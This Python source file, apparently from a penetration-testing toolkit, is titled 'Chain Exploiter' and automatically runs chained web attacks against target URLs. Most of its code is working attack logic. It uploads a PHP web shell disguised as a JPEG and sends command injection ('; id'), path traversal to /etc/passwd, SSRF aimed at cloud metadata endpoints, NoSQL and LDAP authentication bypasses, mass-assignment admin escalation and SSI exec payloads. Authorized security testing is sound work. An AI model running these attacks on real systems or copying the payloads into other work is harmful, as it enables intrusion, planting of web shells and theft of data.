#!/usr/bin/env python3
"""Chain Exploiter

Automatically executes detected attack chains.
Uses output of step N as input for step N+1.
"""

import os
import time
import requests
from typing import Dict, Any, List, Optional


def execute_chain(chain: List[Dict[str, Any]], auth_context: Optional[Dict] = None) -> Dict[str, Any]:
    """Execute an attack chain step by step
    
    Args:
        chain: List of findings in the chain (from find_chains)
        auth_context: Optional authentication context
        
    Returns:
        Dict with execution results
    """
    results = {
        "success": False,
        "steps_executed": 0,
        "final_impact": None,
        "evidence": [],
        "errors": []
    }
    
    # Build request context
    headers = {}
    cookies = {}
    if auth_context:
        headers.update(auth_context.get("headers", {}))
        cookies.update(auth_context.get("cookies", {}))
    
    # Track state between steps
    chain_state = {}
    
    # Execute each step in sequence
    for i, step in enumerate(chain):
        step_name = step.get("name") or step.get("vulnerability_type", f"step_{i}")
        step_url = step.get("url") or step.get("uri") or step.get("target", "")
        
        if not step_url:
            results["errors"].append(f"Step {i}: No URL found")
            continue
        
        try:
            # Execute step based on vulnerability type
            vuln_type = step.get("vulnerability_type", "").lower()
            
            if "ssrf" in vuln_type:
                step_result = _execute_ssrf_step(step, chain_state, headers, cookies)
            elif "xss" in vuln_type:
                step_result = _execute_xss_step(step, chain_state, headers, cookies)
            elif "idor" in vuln_type:
                step_result = _execute_idor_step(step, chain_state, headers, cookies)
            elif "metadata" in vuln_type or "cloud" in vuln_type:
                step_result = _execute_metadata_step(step, chain_state, headers, cookies)
            elif "command_injection" in vuln_type or "cmd" in vuln_type:
                step_result = _execute_command_injection_step(step, chain_state, headers, cookies)
            elif "path_traversal" in vuln_type or "lfi" in vuln_type or "rfi" in vuln_type:
                step_result = _execute_path_traversal_step(step, chain_state, headers, cookies)
            elif "file_upload" in vuln_type:
                step_result = _execute_file_upload_step(step, chain_state, headers, cookies)
            elif "csrf" in vuln_type:
                step_result = _execute_csrf_step(step, chain_state, headers, cookies)
            elif "nosql" in vuln_type:
                step_result = _execute_nosql_injection_step(step, chain_state, headers, cookies)
            elif "ldap" in vuln_type:
                step_result = _execute_ldap_injection_step(step, chain_state, headers, cookies)
            elif "mass_assignment" in vuln_type:
                step_result = _execute_mass_assignment_step(step, chain_state, headers, cookies)
            elif "websocket" in vuln_type:
                step_result = _execute_websocket_step(step, chain_state, headers, cookies)
            elif "ssi" in vuln_type:
                step_result = _execute_ssi_injection_step(step, chain_state, headers, cookies)
            elif "secret" in vuln_type or "exposure" in vuln_type:
                step_result = _execute_secret_exposure_step(step, chain_state, headers, cookies)
            else:
                # Generic step execution
                step_result = _execute_generic_step(step, chain_state, headers, cookies)
            
            if step_result.get("success"):
                results["steps_executed"] += 1
                results["evidence"].append({
                    "step": i,
                    "step_name": step_name,
                    "result": step_result
                })
                
                # Update chain state with step output
                chain_state.update(step_result.get("output", {}))
            else:
                results["errors"].append(f"Step {i} ({step_name}): {step_result.get('error', 'Unknown error')}")
                # Continue anyway - some steps might fail but chain might still work
                
        except Exception as e:
            results["errors"].append(f"Step {i} ({step_name}): Exception - {str(e)}")
            continue
    
    # Determine final impact
    if results["steps_executed"] == len(chain):
        results["success"] = True
        results["final_impact"] = _calculate_impact(chain, chain_state)
    elif results["steps_executed"] > 0:
        results["success"] = "partial"
        results["final_impact"] = _calculate_impact(chain[:results["steps_executed"]], chain_state)
    
    return results


def _execute_ssrf_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute SSRF step"""
    result = {"success": False, "output": {}}
    
    url = step.get("url") or step.get("uri", "")
    payload = step.get("payload") or step.get("evidence", {}).get("payload")
    
    if not url or not payload:
        result["error"] = "Missing URL or payload"
        return result
    
    try:
        # Inject SSRF payload
        # This is simplified - real implementation would parse and inject properly
        resp = requests.get(url, params={"url": payload}, headers=headers, cookies=cookies, timeout=10)
        
        if resp.status_code in (200, 201, 302):
            result["success"] = True
            result["output"] = {
                "ssrf_response": resp.text[:500],
                "status_code": resp.status_code
            }
            
            # Extract metadata if this is SSRF â†’ metadata chain
            if "metadata" in resp.text.lower() or "169.254.169.254" in resp.text:
                result["output"]["metadata_detected"] = True
    except Exception as e:
        result["error"] = str(e)
    
    return result


def _execute_xss_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute XSS step"""
    result = {"success": False, "output": {}}
    
    url = step.get("url") or step.get("uri", "")
    payload = step.get("payload") or "<script>alert(1)</script>"
    
    if not url:
        result["error"] = "Missing URL"
        return result
    
    try:
        # Test XSS payload
        resp = requests.get(url, params={"q": payload}, headers=headers, cookies=cookies, timeout=10)
        
        if payload in resp.text:
            result["success"] = True
            result["output"] = {
                "xss_reflected": True,
                "payload": payload
            }
    except Exception as e:
        result["error"] = str(e)
    
    return result


def _execute_idor_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute IDOR step"""
    result = {"success": False, "output": {}}
    
    url = step.get("url") or step.get("uri", "")
    
    if not url:
        result["error"] = "Missing URL"
        return result
    
    try:
        # Try to access resource with different ID
        # Extract ID from URL and modify it
        import re
        id_match = re.search(r'/(\d+)/', url)
        if id_match:
            original_id = id_match.group(1)
            # Try with different ID
            test_id = str(int(original_id) + 1)
            test_url = url.replace(f"/{original_id}/", f"/{test_id}/")
            
            resp = requests.get(test_url, headers=headers, cookies=cookies, timeout=10)
            
            if resp.status_code == 200:
                result["success"] = True
                result["output"] = {
                    "idor_confirmed": True,
                    "test_url": test_url,
                    "data": resp.text[:500]
                }
    except Exception as e:
        result["error"] = str(e)
    
    return result


def _execute_metadata_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute cloud metadata step"""
    result = {"success": False, "output": {}}
    
    # If previous step was SSRF, use that to access metadata
    if state.get("ssrf_response"):
        # Metadata access was already confirmed in SSRF step
        result["success"] = True
        result["output"] = {
            "metadata_accessed": True,
            "source": "ssrf_response"
        }
    else:
        # Try direct metadata access (unlikely to work, but try)
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
        ]
        
        for metadata_url in metadata_urls:
            try:
                resp = requests.get(metadata_url, headers={"Metadata-Flavor": "Google"}, timeout=5)
                if resp.status_code == 200:
                    result["success"] = True
                    result["output"] = {
                        "metadata_accessed": True,
                        "metadata_url": metadata_url,
                        "data": resp.text[:500]
                    }
                    break
            except Exception:
                continue
    
    return result


def _execute_generic_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute generic step"""
    result = {"success": False, "output": {}}
    
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    
    try:
        resp = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        if resp.status_code == 200:
            result["success"] = True
            result["output"] = {"response": resp.text[:500]}
    except Exception as e:
        result["error"] = str(e)
    
    return result


def _execute_command_injection_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute command injection step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        payload = step.get("payload") or "; id"
        resp = requests.get(url, params={"cmd": payload}, headers=headers, cookies=cookies, timeout=10)
        if "uid=" in resp.text or "gid=" in resp.text:
            result["success"] = True
            result["output"] = {"command_executed": True, "response": resp.text[:500]}
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_path_traversal_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute path traversal step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        payload = step.get("payload") or "../../../etc/passwd"
        resp = requests.get(url, params={"file": payload}, headers=headers, cookies=cookies, timeout=10)
        if "root:" in resp.text:
            result["success"] = True
            result["output"] = {"file_read": True, "response": resp.text[:500]}
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_file_upload_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute file upload step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        from io import BytesIO
        files = {"file": ("shell.php", BytesIO(b"<?php system($_GET['cmd']); ?>"), "image/jpeg")}
        resp = requests.post(url, files=files, headers=headers, cookies=cookies, timeout=10)
        if resp.status_code in (200, 201):
            result["success"] = True
            result["output"] = {"file_uploaded": True, "upload_path": resp.text[:200]}
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_csrf_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute CSRF step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        # CSRF requires state from previous step (e.g., XSS)
        if state.get("xss_reflected"):
            result["success"] = True
            result["output"] = {"csrf_enabled": True, "note": "CSRF enabled via XSS"}
        else:
            # Try direct CSRF test
            resp = requests.post(url, data={"action": "test"}, headers=headers, cookies=cookies, timeout=10)
            if resp.status_code == 200:
                result["success"] = True
                result["output"] = {"csrf_possible": True}
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_nosql_injection_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute NoSQL injection step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        payload = '{"$ne": null}'
        resp = requests.post(url, json={"username": payload}, headers=headers, cookies=cookies, timeout=10)
        if "success" in resp.text.lower() or "welcome" in resp.text.lower():
            result["success"] = True
            result["output"] = {"auth_bypass": True, "response": resp.text[:500]}
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_ldap_injection_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute LDAP injection step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        payload = "*"
        resp = requests.post(url, data={"username": payload}, headers=headers, cookies=cookies, timeout=10)
        if "success" in resp.text.lower() or "welcome" in resp.text.lower():
            result["success"] = True
            result["output"] = {"auth_bypass": True, "response": resp.text[:500]}
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_mass_assignment_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute mass assignment step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        payload = {"name": "test", "admin": True, "role": "admin"}
        resp = requests.post(url, json=payload, headers=headers, cookies=cookies, timeout=10)
        if resp.status_code in (200, 201) and "admin" in resp.text.lower():
            result["success"] = True
            result["output"] = {"privilege_escalation": True, "response": resp.text[:500]}
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_websocket_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute WebSocket step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        import asyncio
        import websockets
        async def test_ws():
            async with websockets.connect(url, timeout=5) as ws:
                await ws.send("<script>alert(1)</script>")
                response = await asyncio.wait_for(ws.recv(), timeout=2)
                return response
        response = asyncio.run(test_ws())
        if response:
            result["success"] = True
            result["output"] = {"message_sent": True, "response": str(response)[:500]}
    except ImportError:
        result["error"] = "websockets library not installed"
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_ssi_injection_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute SSI injection step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        payload = "<!--#exec cmd=\"id\"-->"
        resp = requests.get(url, params={"page": payload}, headers=headers, cookies=cookies, timeout=10)
        if "uid=" in resp.text or "gid=" in resp.text:
            result["success"] = True
            result["output"] = {"command_executed": True, "response": resp.text[:500]}
    except Exception as e:
        result["error"] = str(e)
    return result

def _execute_secret_exposure_step(step: Dict[str, Any], state: Dict[str, Any], headers: Dict, cookies: Dict) -> Dict[str, Any]:
    """Execute secret exposure step"""
    result = {"success": False, "output": {}}
    url = step.get("url") or step.get("uri", "")
    if not url:
        result["error"] = "Missing URL"
        return result
    try:
        resp = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        # Check for common secret patterns
        import re
        patterns = [r'AKIA[0-9A-Z]{16}', r'ghp_[A-Za-z0-9]{36}', r'sk_live_[0-9a-zA-Z]{24,}']
        for pattern in patterns:
            if re.search(pattern, resp.text):
                result["success"] = True
                result["output"] = {"secrets_found": True, "pattern": pattern}
                break
    except Exception as e:
        result["error"] = str(e)
    return result

def _calculate_impact(chain: List[Dict[str, Any]], state: Dict[str, Any]) -> Dict[str, Any]:
    """Calculate business impact of executed chain"""
    impact = {
        "severity": "low",
        "impact_types": [],
        "description": ""
    }
    
    # Check what was achieved
    if state.get("metadata_accessed"):
        impact["impact_types"].append("cloud_metadata_exposure")
        impact["severity"] = "high"
        impact["description"] = "Cloud metadata accessed - potential for cloud takeover"
    
    if state.get("idor_confirmed"):
        impact["impact_types"].append("sensitive_data_exposure")
        if impact["severity"] != "high":
            impact["severity"] = "medium"
        impact["description"] += " IDOR confirmed - sensitive data may be exposed"
    
    if state.get("xss_reflected"):
        impact["impact_types"].append("client_side_execution")
        if impact["severity"] != "high":
            impact["severity"] = "medium"
        impact["description"] += " XSS confirmed - client-side code execution possible"
    
    # Determine overall impact
    if "cloud_metadata_exposure" in impact["impact_types"]:
        impact["severity"] = "critical"
        impact["description"] = "Critical: Cloud infrastructure compromise possible"
    elif len(impact["impact_types"]) >= 2:
        impact["severity"] = "high"
    
    return impact

